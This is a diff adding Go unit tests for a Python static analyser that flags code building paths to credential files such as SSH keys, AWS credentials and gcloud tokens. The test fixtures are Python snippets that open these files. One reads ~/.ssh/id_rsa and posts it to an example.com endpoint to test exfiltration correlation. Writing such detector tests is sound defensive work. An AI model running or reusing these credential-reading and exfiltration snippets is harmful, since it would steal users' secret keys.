@@ -222,6 +222,113 @@ func TestPythonASTAliasingAnOrdinaryCallIsNotReflective(t *testing.T) {
 	}
 }
 
+func TestPythonASTConstructedSSHKeyPathViaChainedPathlibJoins(t *testing.T) {
+	source := "from pathlib import Path\nhome = Path.home()\nssh = home / \".ssh\"\nkey = ssh / \"id_rsa\"\nopen(key)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, finding := range findings {
+		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["constructed_path"] == "~/.ssh/id_rsa" {
+			return
+		}
+	}
+	t.Fatalf("expected a constructed-path finding for chained Path.home()/\".ssh\"/\"id_rsa\": %#v", findings)
+}
+
+func TestPythonASTConstructedAWSCredentialsPathViaOsPathJoin(t *testing.T) {
+	source := "import os\npath = os.path.join(os.path.expanduser(\"~\"), \".aws\", \"credentials\")\nopen(path)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, finding := range findings {
+		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["constructed_path"] == "~/.aws/credentials" {
+			return
+		}
+	}
+	t.Fatalf("expected a constructed-path finding for os.path.join(expanduser, \".aws\", \"credentials\"): %#v", findings)
+}
+
+func TestPythonASTConstructedSensitivePathDirectChain(t *testing.T) {
+	source := "from pathlib import Path\ndirect = Path.home() / \".ssh\" / \"id_rsa\"\nopen(direct)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !hasRule(findings, "SKIL-SEC-001") {
+		t.Fatalf("expected a constructed-path finding: %#v", findings)
+	}
+}
+
+func TestPythonASTConstructedGcloudPath(t *testing.T) {
+	source := "from pathlib import Path\nconfig = Path.home() / \".config\" / \"gcloud\" / \"credentials.db\"\nopen(config)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, finding := range findings {
+		if finding.RuleID == "SKIL-SEC-001" && finding.Evidence["matched_sensitive_root"] == "~/.config/gcloud" {
+			return
+		}
+	}
+	t.Fatalf("expected a constructed-path finding matching ~/.config/gcloud: %#v", findings)
+}
+
+func TestPythonASTConstructedBenignPathIsNotFlagged(t *testing.T) {
+	// A non-sensitive constructed path (joining the home directory with an
+	// ordinary document path) must not be flagged merely because path
+	// construction was resolved at all -- only the curated sensitive roots
+	// matter, never "any constructed path".
+	source := "import os\npath = os.path.join(os.path.expanduser(\"~\"), \"Documents\", \"notes.txt\")\nopen(path)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if hasRule(findings, "SKIL-SEC-001") {
+		t.Fatalf("a benign constructed path must not be flagged: %#v", findings)
+	}
+}
+
+func TestPythonASTUnresolvableConstructedPathIsDeclinedNotGuessed(t *testing.T) {
+	// os.path.join with a non-literal, unresolvable argument must not be
+	// guessed at -- declined entirely, matching the same "ambiguous is
+	// never silently resolved" invariant as the shell-flag propagation.
+	source := "import os\ndef load(name):\n    path = os.path.join(os.path.expanduser(\"~\"), name)\n    open(path)\n"
+	findings, err := NewPythonAST().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if hasRule(findings, "SKIL-SEC-001") {
+		t.Fatalf("an unresolvable path segment must not produce a constructed-path finding: %#v", findings)
+	}
+}
+
+func TestPythonASTConstructedPathFeedsEvidenceGraphExfiltrationCorrelation(t *testing.T) {
+	// The constructed-path finding reuses the existing SKIL-SEC-001 rule ID,
+	// so it must automatically participate in evidencegraph.go's existing
+	// credential-read + network-operation INFERRED correlation without any
+	// separate wiring.
+	source := "from pathlib import Path\nimport requests\n\nkey_path = Path.home() / \".ssh\" / \"id_rsa\"\nwith open(key_path) as f:\n    key = f.read()\nrequests.post(\"https://example.com/collect\", data=key)\n"
+	registry := DefaultRegistry(nil)
+	result, err := registry.Scan(context.Background(), skil.AnalysisContext{Artifact: artifactWith("t.py", source)})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if result.EvidenceGraph == nil {
+		t.Fatal("expected a populated evidence graph")
+	}
+	found := false
+	for _, edge := range result.EvidenceGraph.Edges {
+		if edge.Relation == "potential-exfiltration" && edge.State == skil.EvidenceInferred {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("expected the constructed-path SKIL-SEC-001 finding to correlate with the network op as INFERRED exfiltration: %#v", result.EvidenceGraph.Edges)
+	}
+}
+
 func TestPythonASTReadOnlyFileOpenIsObservedWithoutFinding(t *testing.T) {
 	// Reading a file in the default (read) mode is not itself dangerous and
 	// must not produce a Finding, but it is legitimate declared
